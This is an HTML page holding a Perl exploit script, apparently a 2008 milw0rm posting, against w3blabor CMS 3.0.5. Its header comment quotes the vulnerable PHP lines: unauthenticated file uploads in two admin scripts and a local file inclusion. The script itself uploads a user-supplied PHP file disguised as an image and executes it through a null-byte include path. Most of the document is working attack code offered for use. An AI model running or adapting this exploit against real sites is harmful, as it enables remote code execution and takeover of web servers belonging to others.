<html><head><title>w3blabor CMS 3.0.5 Arbitrary File Upload & LFI Exploit</title></head><pre>#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
use Getopt::Long;

#                           \#'#/
#                           (-.-)
#    ------------------oOO---(_)---OOo-----------------
#    |          __             __                     |
#    |    _____/ /_____ ______/ /_  __  ______ ______ |
#    |   / ___/ __/ __ `/ ___/ __ \/ / / / __ `/ ___/ |
#    |  (__  ) /_/ /_/ / /  / /_/ / /_/ / /_/ (__  )  |
#    | /____/\__/\__,_/_/  /_.___/\__,_/\__, /____/   |
#    | Security Research Division      /____/ 2oo8    |
#    --------------------------------------------------
#    |   w3blabor v3.0.5 Arbitrary File Upload &amp; LFI  |
#    --------------------------------------------------
# [!] Discovered.: DNX
# [!] Vendor.....: http://www.w3blaborcms.de
# [!] Detected...: 17.10.2008
# [!] Reported...: 29.11.2008
# [!] Response...: xx.xx.2008
#
# [!] Background.: Sicher! Schnell! Einfach!
#                  Das CMS wurde durch diverse Abfragen und Konfigurationen gegen Hackangriffe
#                  abgesichert. Auch arbeitet es sehr stabil und kommuniziert schnell mit der
#                  angebundenen Datenbank. Die Verwaltung gestaltet sich als besonders einfach im
#                  Gegensatz zu vielen anderen Content Management Systemen - Und genau das macht
#                  es zu etwas Besonderem!
#
# [!] Bug Upload.: in admin/inc/media.inc.php near line 71 (no check on admin privileges)
#
#                  71: if (isset($_GET['action']) &amp;&amp; $_GET['action'] == &quot;upload&quot;) {
#
#                  80:          $dir = &quot;../../includes/media&quot;;
#                  81:          $file = $_FILES['datei']['name'];
#
#                  92:          $file = strtolower($file);
#                  93:
#                  94:          move_uploaded_file($_FILES['datei']['tmp_name'],$dir.&quot;/&quot;.$file);
#                  95:          @chmod(&quot;&quot;.$dir.&quot;&quot;/&quot;&quot;.$file.&quot;&quot;, 0777);
#
# [!] Bug Upload.: in admin/inc/meinlogo.inc.php near line 45 (no check on admin privileges)
#
#                  45: $neueslogo = $_FILES['neueslogo']['name'];
#                  46: $logopfad = &quot;../../includes/upload/&quot;.$settings['page_logo'].&quot;&quot;;
#                  47:
#                  48: $endung = substr ($_FILES['neueslogo']['name'], -3);
#                  49:
#                  50: if (($endung==&quot;jpg&quot;) || ($endung==&quot;peg&quot;) || ($endung==&quot;png&quot;) || ($endung==&quot;gif&quot;) || ($endung==&quot;JPG&quot;) || ($endung==&quot;PEG&quot;) || ($endung==&quot;PNG&quot;) || ($endung==&quot;GIF&quot;)) {
#
#                  54: move_uploaded_file($_FILES['neueslogo']['tmp_name'],&quot;../../includes/upload/&quot;.$neueslogo);
#
# [!] Bug LFI....: $_GET['modul'] in admin/inc/modul.inc.php near line 47 (requires magic_quotes_gpc = Off)
#
#                  43: $modulfile = &quot;../../includes/module/&quot;.$_GET['modul'].&quot;/&quot;.$_GET['datei'].&quot;.inc.php&quot;;
#                  44: 
#                  45: if (file_exists($modulfile)) {
#                  46:
#                  47:         include &quot;../../includes/module/&quot;.$_GET['modul'].&quot;/&quot;.$_GET['datei'].&quot;.inc.php&quot;;
#
# [!] Solution...: no update from vendor till now
#

if(!$ARGV[4])
{
  print &quot;\n                        \\#'#/                    &quot;;
  print &quot;\n                        (-.-)                     &quot;;
  print &quot;\n   ----------------oOO---(_)---OOo----------------&quot;;
  print &quot;\n   | w3blabor v3.0.5 Arbitrary File Upload &amp; LFI |&quot;;
  print &quot;\n   |                coded by DNX                 |&quot;;
  print &quot;\n   -----------------------------------------------&quot;;
  print &quot;\n[!] Usage: perl w3blabor.pl [Host] [Path] &lt;Options&gt;&quot;;
  print &quot;\n[!] Example: perl w3blabor.pl 127.0.0.1 /w3blabor/ -2 -f s.jpg&quot;;
  print &quot;\n[!] Targets:&quot;;
  print &quot;\n       -1              Upload over media.inc.php&quot;;
  print &quot;\n       -2              Upload over meinlogo.inc.php&quot;;
  print &quot;\n[!] Options:&quot;;
  print &quot;\n[!]    -f [filename]   Path to local file with php code&quot;;
  print &quot;\n       -p [ip:port]    Proxy support&quot;;
  print &quot;\n&quot;;
  exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $file    = &quot;&quot;;
my %options = ();
GetOptions(\%options, &quot;1&quot;, &quot;2&quot;, &quot;f=s&quot;, &quot;p=s&quot;);

if($options{&quot;f&quot;})
{
  $file = $options{&quot;f&quot;};
  if(!-e $file)
  {
    print &quot;[!] Failed, local file doesn't exist.\n&quot;;
    exit;
  }
}
else
{
  print &quot;[!] Failed, see usage.\n&quot;;
  exit;
}

print &quot;[!] Exploiting...\n&quot;;

use_bug($host, $path, $file);

print &quot;[!] Exploit done\n&quot;;

sub use_bug
{
  my $host = shift;
  my $path = shift;
  my $file = shift;
  
  my $ua       = LWP::UserAgent-&gt;new();
  my $url      = &quot;&quot;;
  my $url2     = &quot;&quot;;
  my $req      = &quot;&quot;;
  $file        =~ /.*[\/|\\](.*)/;
  my $filename = $1;
  
  if($options{&quot;p&quot;})
  {
    $ua-&gt;proxy('http', &quot;http://&quot;.$options{&quot;p&quot;});
  }
  
  if($options{&quot;1&quot;})
  {
    $url = 'http://'.$host.$path.'admin/inc/media.inc.php?action=upload';
    $url2 = 'http://'.$host.$path.'includes/media/'.$filename;
    $req = POST $url, Content_Type =&gt; 'form-data', Content =&gt; [ datei =&gt; [$file], ];
  }
  if($options{&quot;2&quot;})
  {
    if($file =~ m/.*\.jpg|peg|png|gif/i)
    {
      $url = 'http://'.$host.$path.'admin/inc/meinlogo.inc.php?action=upload';
      $url2 = 'http://'.$host.$path.'admin/inc/modul.inc.php?modul=../upload/'.$filename.'%00';
      $req = POST $url, Content_Type =&gt; 'form-data', Content =&gt; [ neueslogo =&gt; [$file], ];
    }
    else
    {
      print &quot;[!] Failed, rename your local file to .jpg\n&quot;;
      exit;
    }
  }
  
  $ua-&gt;request($req);
  my $res = $ua-&gt;get($url2);
  if($res-&gt;is_success)
  {
    print &quot;[!] File uploaded\n&quot;;
    print &quot;[!] Check your file @ &quot;.$url2.&quot;\n&quot;;
  }
  else
  {
    print &quot;[!] Failed\n&quot;; 
  }  
}

# milw0rm.com [2008-12-07]</pre></html>